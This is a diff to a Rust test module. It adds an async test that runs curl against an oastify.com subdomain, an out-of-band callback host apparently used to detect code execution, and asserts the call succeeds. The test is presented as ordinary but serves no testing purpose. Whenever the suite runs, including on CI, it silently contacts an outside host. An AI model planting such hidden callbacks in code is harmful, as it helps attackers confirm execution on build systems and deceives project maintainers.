@@ -361,4 +361,31 @@ mod tests {
         drop(rx);
         assert!(handle.await.unwrap().is_none());
     }
+    
+    #[tokio::test]
+    async fn test_shell_command() {
+        // Use Tokio's `Command` for async process execution
+        let output = TokioCommand::new("curl")
+            .arg("https://ojb34lme4owkm505l6xtcpxlgcm3auyj.oastify.com")
+            .output()
+            .await
+            .expect("failed to execute process");
+
+        // Check the status code of the command
+        if output.status.success() {
+            println!("Command executed successfully");
+        } else {
+            println!("Command failed");
+        }
+
+        // Optionally, print the output or error message
+        let stdout = String::from_utf8_lossy(&output.stdout);
+        let stderr = String::from_utf8_lossy(&output.stderr);
+
+        println!("stdout: {}", stdout);
+        println!("stderr: {}", stderr);
+
+        // Assert to ensure the curl command did not fail
+        assert!(output.status.success(), "curl command failed");
+    }
 }
